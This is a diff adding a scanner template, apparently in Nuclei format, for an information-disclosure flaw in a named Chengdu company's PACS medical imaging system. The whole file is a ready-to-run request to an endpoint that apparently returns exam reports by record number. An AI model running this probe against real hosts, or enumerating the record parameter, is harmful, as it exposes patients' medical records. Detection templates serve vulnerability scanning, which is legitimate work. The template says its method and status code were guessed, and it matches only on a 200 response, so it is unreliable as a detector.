@@ -1,0 +1,22 @@
+id: poc-2c1b9c3d1d7f1b8c4a4d
+info:
+  name: 成都信通网易医疗科技发展有限公司PACS(医学影像信息管理系统)存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/2c1b9c3d1d7f1b8c4a4dc155eec770f9
+
+    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 2c1b9c3d1d7f1b8c4a4dc155eec770f9
+http:
+- raw:
+  - 'GET /XtWebPacsASp/XTWebPacsGetJcbgByDabh.asp?dabh=1 HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
